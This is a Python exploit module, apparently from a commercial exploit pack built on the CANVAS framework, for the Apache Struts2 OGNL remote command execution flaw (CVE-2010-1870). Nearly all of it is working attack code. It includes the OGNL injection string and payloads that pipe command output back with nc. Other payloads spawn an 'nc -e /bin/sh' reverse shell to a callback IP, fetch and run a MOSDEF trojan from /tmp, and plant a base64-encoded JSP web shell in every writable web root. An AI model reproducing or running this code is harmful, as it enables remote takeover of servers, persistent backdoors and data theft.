
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer

from shelllistener import shelllistener
from shelllistener import *
from unixShellNode import unixShellNode
from libs.ctelnetlib import Telnet

from libs import spkproxy
import urllib

######################################################################################
NAME = "Struts2 Command Execution"
DESCRIPTION = "Command execution through OGNL statements on versions <2.2.1"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Apache'
DOCUMENTATION["Date public"] = "2010-07-09"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE'] = "cve-2010-1870"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1870'
DOCUMENTATION["References"] = "http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html"
DOCUMENTATION["Notes"] = """This module has unique payloads.
Payloads:
0: Execute Command (blind)
  This will execute a command on the server, but you will see no response
1: Execute Command (nc pipe)
  This will execute a command on the server, and try to pipe the results back to the specified DataPort
2: TCP Connect Back (nc -e)
  This will attempt to spawn a connect back shell using nc with the -e option to the specified DataPort
3: TCP Connect Back Drop Trojan
  This will attempt to connect back to the specified DataPort and upload a Mosdef trojan which will connect back 
4: Create Web Shell
  This is the best option and will upload a webshell and copy it to all the webroots it can find

"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]


NOTES="""
WP> White Phosphorus Exploit Pack
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip>

Payload Options:
-O path:<path#>  (path to the action)
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O dataport:<#>  (port used for data connections)

Versions:
0: Struts 2.x

Payloads:
0: Execute Command (blind)
1: Execute Command (nc pipe)
2: TCP Connect Back (nc -e)
3: TCP Connect Back Drop Trojan
4: Create Web Shell
    
Example:
./3rdparty/White_Phosphorus/exploits/wp_struts2_cmdexec/wp_struts2_cmdexec.py  -v0 -t 10.1.1.10 -l 10.1.1.1  -O payload:0
"""

PORT = 80
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Struts 2.x", (0x00000000, 0x00000000, 0x0000), []]
}

class theexploit(wp_exploit):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["Execute Command (blind)",
              "Execute Command (nc pipe)",
              "TCP Connect Back (nc -e)",
              "TCP Connect Back Drop Trojan",
              "Create Web Shell"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = ".,:;\x00\x0a\x0d"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.use_universal=True
        self.autoVersioned = False
        self.headers = []
        self.data_port = 53
        self.basepath = "/"
        self.cmdExec = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\u003d\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(\"false\")))&(asdf)(('\\u0023rt.exec(\"/bin/sh%20-c%20THECMD\")')(\\u0023rt\\u003d@java.lang.Runtime@getRuntime()))=1"
        return

    def usage(self):
        print """
WP> White Phosphorus Exploit Pack
---------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip>

Payload Options:
-O path:<path#>  (path to the action)
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O dataport:<#>  (port used for data connections)


Versions:
0: Struts 2.x

Payloads:
0: Execute Command (blind)
1: Execute Command (nc pipe)
2: TCP Connect Back (nc -e)
3: TCP Connect Back Drop Trojan
4: Create Web Shell

Example:
./3rdparty/White_Phosphorus/exploits/wp_struts2_cmdexec/wp_struts2_cmdexec.py  -v0 -t 10.1.1.10 -l 10.1.1.1 -O payload:0
"""
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return wp_isPortOpen(self, self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return   

    def getArgs(self):
        # Command line options
        if not getattr(self, 'RunFromGUI',False):
            if self.argsDict.has_key("payload"):
                p =int(self.argsDict["payload"])
                self.argsDict["payloadType"] = self.PAYLOADS[p]
            else:
                self.argsDict["payloadType"] = self.PAYLOADS[self.DEFAULT_PAYLOAD]
        
        if self.argsDict.has_key("command"):
            p = self.argsDict["command"]
            self.argsDict["payloadExecCmd2"] = p

        if self.argsDict.has_key("dataport"):
            p =int(self.argsDict["dataport"])
            self.data_port = p

        if self.argsDict.has_key("path"):
            p = self.argsDict["path"]
            self.basepath = p
        
        
        if self.argsDict.has_key("cookies"):
            self.headers.append(("Cookie",self.argsDict["cookies"]))
                
        if self.argsDict.get('payloadType','') == 'Execute Command (blind)':
            self.shell_EXECCMD = True
            self.shell_TCPCONNECTBACK = True    # to cause the ip:port to be populated
            self.execCMD = self.argsDict.get('payloadExecCmd2')
        elif self.argsDict.get('payloadType','') == 'Execute Command (nc pipe)':
            self.shell_TCPCONNECTBACK = True    # to cause the ip:port to be populated
            self.execCMD = self.argsDict.get('payloadExecCmd2')            
        else:
            self.shell_EXECCMD = False
            self.shell_TCPCONNECTBACK = True    # to cause the ip:port to be populated
        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.url = "http%s://%s:%d%s?"%(self.ssl and "s" or "", self.host, self.port, self.basepath)
       
        if self.argsDict.get("hostname", False):
            self.hostname = self.argsDict["hostname"]
        else: 
            self.hostname = "%s:%d" % (self.argsDict.get("hostname", self.target.interface), self.port)
        self.headers.append(("Host", self.hostname))
        self.ssl = self.argsDict.get("ssl", False)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
        
    def executeCommandBlind(self):
        
        # This works
        #       /bin/sh%20-c%20id${IFS}>/tmp/id4
        # This doesn't
        #       /bin/sh%20-c%20id${IFS}>${IFS}/tmp/id4
        self.execCMD = self.execCMD.replace("> ",">")
    
        self.log('WP> Running blind command: %s' % (self.execCMD))
        payload = self.cmdExec.replace("THECMD",self.execCMD.replace(" ","${IFS}"))
        
        result = spkproxy.urlopen(self.url + payload, extraheaders=self.headers, data="", exploit=self)

        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        self.log("WP> Command executed successfully")
        return 1

    def executeCommandPiped(self):
        
        self.log('WP> Piping command response to: %s:%s' % (self.callback.ip,self.data_port))
        pipecmd = self.execCMD + "|nc -n " + self.callback.ip + " " + str(self.data_port)
        payload = self.cmdExec.replace("THECMD",pipecmd.replace(" ","${IFS}"))
    
        lsock = self.gettcplistener(self.data_port,self.callback.ip)
        if lsock == None: 
            self.log("WP> Unable to listen on port %d"%self.data_port)
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        self.log("WP> Listening for pipe on port %d"%self.data_port)
       
        self.log('WP> Running command: %s' % (self.execCMD + "|nc -n " + self.callback.ip + " " + str(self.data_port)))
        
        result = spkproxy.urlopen(self.url + payload, extraheaders=self.headers, data="", exploit=self)
        
        self.log("WP> Awaiting response connect back")
        lsock.set_timeout(30)
        try:
            (s2, addr) = lsock.accept()
            s2.set_timeout(2)
            
            self.log("WP> Command output")
            try:
                data=s2.recv(5000)
                self.log("\n%s"%data)
            except timeoutsocket.Timeout:
                data=""
                
            s2.close()
            
            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            self.log("WP> Command executed successfully")
            return 1                   
        except:
            self.log("WP> Connectback failed, command still executed")
            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            return 0
        return 1
        
    def ncCallbackShell(self):
        
        shellback = "nc -n " + self.callback.ip + " " + str(self.data_port) + " -e /bin/sh"
        payload = self.cmdExec.replace("THECMD",urlencode(shellback))
    
        lsock = self.gettcplistener(self.data_port,self.callback.ip)
        if lsock == 0: 
            self.log("WP> Unable to list on port %d"%self.data_port)
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        self.log("WP> Listening on port %d"%self.data_port)
        
        
        self.log("WP> Sending Exploit")
        result = spkproxy.urlopen(self.url + payload,extraheaders=self.headers, data="", exploit=self)
            
        self.log("WP> Awaiting connectback")
        lsock.set_timeout(30)
        try:
            (s2, addr) = lsock.accept()
            s2.set_timeout(2)
        except:
            self.log("WP> Connectback failed")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        telnetshell=Telnet()
        telnetshell.sock=s2
        
        try:
            shell = shelllistener(shellfromtelnet(telnetshell), logfunction=self.logfunction, simpleShell=1)
        except:
            self.log("WP> Shell listener failed - connection closed")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        node = unixShellNode()
        node.parentnode = self.argsDict["passednodes"][0]        
        node.shell = shell
        
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return node
        
        
    def ncCallbackTrojan(self):
        # wait for a nc callback and send down a trojan
        
        trojancmd = "nc -n " + self.callback.ip + " " + str(self.data_port) + " >/tmp/a"
        payload = self.cmdExec.replace("THECMD",trojancmd.replace(" ","${IFS}"))

        from libs.canvasos import canvasos
        my_os = canvasos("Linux")
        my_os.arch = "x86"
        
        self.log("Building MOSDEF trojan for: %s %s"%(my_os, my_os.arch))
        self.log("Callback set for: %s:%s"%(self.callback.ip,self.callback.port))
        
        try:
            ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=my_os, universal=True)
        except Exception, err:
            self.log("Problem building the MOSDEF trojan: %s"%(err))
            self.setInfo("%s - failed" % (NAME))
            return 0    
    
        lsock = self.gettcplistener(self.data_port,self.callback.ip)
        if lsock == 0: 
            self.log("WP> Unable to listen on port %d"%self.data_port)
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        self.log("WP> Listening for callback on port %d"%self.data_port)
       
        self.log('WP> Sending initiate call back command')
        
        result = spkproxy.urlopen(self.url + payload,extraheaders=self.headers, data="", exploit=self)
        
        self.log("WP> Awaiting connectback")
        lsock.set_timeout(30)
        try:
            (s2, addr) = lsock.accept()
            s2.set_timeout(2)
            
            self.log("WP> Sending callback trojan")
            s2.sendall(self.mosdeftrojan)
            s2.close()
            
            self.log('WP> Sending and executing trojan')
        
            trojancmd = "chmod %2bx /tmp/a;/tmp/a"
            payload = self.cmdExec.replace("THECMD",trojancmd.replace(" ","${IFS}"))
                        
            result = spkproxy.urlopen(self.url+payload,extraheaders=self.headers, data="", exploit=self)            
                        
            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            self.log("WP> Callback trojan sent successfully")
            return 1                   
        except:
            self.log("WP> Connectback failed")
            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            return 0
 
        return 1
                
    def createWebShell(self):
        # tries to find the web root and create a webshell
        #find /tmp/foo -type d -name WEB-INF -writable -exec cp gogo.jsp {}/../ \;
        
        # echo base64data | base64 -d > /tmp/shell
        # echo YXNzCg== | base64 -d
 
        # read file
        filedata = open('3rdparty/White_Phosphorus/exploits/wp_struts2_cmdexec/shell.jsp.txt','rb').read()
        import base64
        filedata = base64.b64encode(filedata)
        
        #filedata = "YXNzCg=="
        # Strip out any trailing ='s
        filedata = filedata.replace("=","")
        filedata = filedata.replace("+","%2b")
        
        
        # Wipe file
        shellcmd = "rm /tmp/a.jsp"
        payload = self.cmdExec.replace("THECMD",shellcmd.replace(" ","${IFS}"))
        result = spkproxy.urlopen(self.url + payload,extraheaders=self.headers, data="", exploit=self)        
        
        filelen=len(filedata)
        pos=0
        self.log('WP> Uploading web shell, %d bytes'%filelen)
        #self.log('WP> %s'%filedata)
        while (pos<filelen):
            self.log('WP> Uploading shell portion, %d bytes'%(pos+200))
            #self.log('WP> %s'%(filedata[pos:pos+200]))
            shellcmd = "echo -n "+filedata[pos:pos+200]+">>/tmp/a.jsp"
            payload = self.cmdExec.replace("THECMD",shellcmd.replace(" ","${IFS}"))
            result = spkproxy.urlopen(self.url + payload,extraheaders=self.headers, data="", exploit=self)            
            pos+=200
            time.sleep(.25) # small delay
        
        self.log('WP> Decoding web shell')
        
        shellcmd = "base64 -d /tmp/a.jsp >/tmp/b.jsp"
        payload = self.cmdExec.replace("THECMD",shellcmd.replace(" ","${IFS}"))
        result = spkproxy.urlopen(self.url + payload,extraheaders=self.headers, data="", exploit=self)            


        self.log('WP> Deploying shell to web directories')
        shellcmd = "find / -type d -name WEB-INF -writable -exec cp /tmp/b.jsp {}/../ \\;"
        payload = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\u003d\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(\"false\")))&(asdf)(('\\u0023rt.exec(\"/bin/sh%20-c%20find${IFS}/${IFS}-type${IFS}d${IFS}-name${IFS}WEB-INF${IFS}-writable${IFS}-exec${IFS}cp${IFS}/tmp/b.jsp${IFS}\\'{}\\'/../${IFS}\\\\\\\\;\")')(\\u0023rt\\u003d@java.lang.Runtime@getRuntime()))=1"
        
        result = spkproxy.urlopen(self.url + payload, extraheaders=self.headers, data="", exploit=self)             
        
        self.log("WP> Try for your webshell under server/b.jsp")
                
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        self.log("WP> Command executed successfully")
        return 1              


    def run(self):
    
        self.getArgs()
    
        self.log("WP> Attacking %s"%self.url)
                
        if self.argsDict.get('payloadType','') == 'Execute Command (blind)':
            return self.executeCommandBlind()

        elif self.argsDict.get('payloadType','') == 'Execute Command (nc pipe)':
            return self.executeCommandPiped()   
        elif self.argsDict.get('payloadType','') == 'TCP Connect Back (nc -e)':
            return self.ncCallbackShell()  
        elif self.argsDict.get('payloadType','') == 'TCP Connect Back Drop Trojan':
            return self.ncCallbackTrojan()
        elif self.argsDict.get('payloadType','') == 'Create Web Shell':
            return self.createWebShell()            
        else:
            return 0     
      
if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
